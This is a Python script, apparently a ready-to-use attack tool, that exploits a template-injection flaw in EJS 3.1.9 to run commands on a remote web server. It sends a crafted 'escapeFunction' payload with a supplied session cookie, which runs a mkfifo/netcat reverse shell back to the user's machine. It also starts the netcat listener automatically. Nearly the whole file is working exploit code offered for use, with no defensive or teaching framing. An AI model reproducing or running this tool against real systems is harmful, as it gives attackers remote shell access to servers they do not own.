import subprocess
import time
import requests
from requests.exceptions import ReadTimeout

# ANSI color codes
PARROT = '\033[1;32m'  # Parrot Green
NC = '\033[0m'         # No Color


def print_banner():
    banner = f"""
{PARROT}************************************************************
*                                                          *
*    EJS@3.1.9 SSTI RCE Auto Shell Spawner Tool             *
*    by MD Momrul Hasan aka momrulhasan                    *
*                                                          *
************************************************************{NC}
"""
    print(banner)


def check_dependencies():
    # Ensure nc is available
    if subprocess.call(['which', 'nc'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print(f"{PARROT}[!] Error: 'nc' (netcat) is required but not installed.{NC}")
        exit(1)


def start_listener(lport):
    print(f"{PARROT}[+] Starting netcat listener on port {lport}...{NC}")
    proc = subprocess.Popen(['nc', '-nlvp', str(lport)])
    time.sleep(2)
    return proc


def send_exploit(rhost, path, postdata, cookie, ejs_payload):
    url = f"http://{rhost}{path}"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie
    }
    data = {}
    for pair in postdata.split('&'):
        key, _, val = pair.partition('=')
        data[key] = val
    data['settings[view options][client]'] = 'true'
    data['settings[view options][escapeFunction]'] = ejs_payload

    print(f"{PARROT}[+] Sending exploit to {url}{NC}")
    try:
        response = requests.post(url, headers=headers, data=data, timeout=(5, 3))
        print(f"{PARROT}[+] HTTP {response.status_code} returned.{NC}")
    except ReadTimeout:
        print(f"{PARROT}[*] Read timeout - payload likely delivered.{NC}")
    except Exception as e:
        print(f"{PARROT}[!] Error sending request: {e}{NC}")


def main():
    print_banner()
    check_dependencies()

    # Interactive inputs
    lhost = input(f"{PARROT}Enter your Listener IP (LHOST): {NC}")
    lport = input(f"{PARROT}Enter your Listener Port (LPORT): {NC}")
    rhost = input(f"{PARROT}Enter Target Host (no http): {NC}")
    path = input(f"{PARROT}Enter Target Path (e.g., /settings): {NC}")
    postdata = input(f"{PARROT}Enter POST Data (e.g., name=ghfg&password=jhgk): {NC}")
    cookie = input(f"{PARROT}Enter Session Cookie (e.g., connect.sid=...): {NC}")

    # Craft reverse shell command and EJS payload
    rev_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    ejs_payload = f"1;return global.process.mainModule.constructor._load('child_process').execSync('{rev_cmd}');"

    # Start listener
    listener = start_listener(lport)

    # Send exploit
    send_exploit(rhost, path, postdata, cookie, ejs_payload)

    # Wait for shell session to end
    listener.wait()
    print(f"{PARROT}[+] Listener exited. Goodbye.{NC}")

if __name__ == '__main__':
    main()

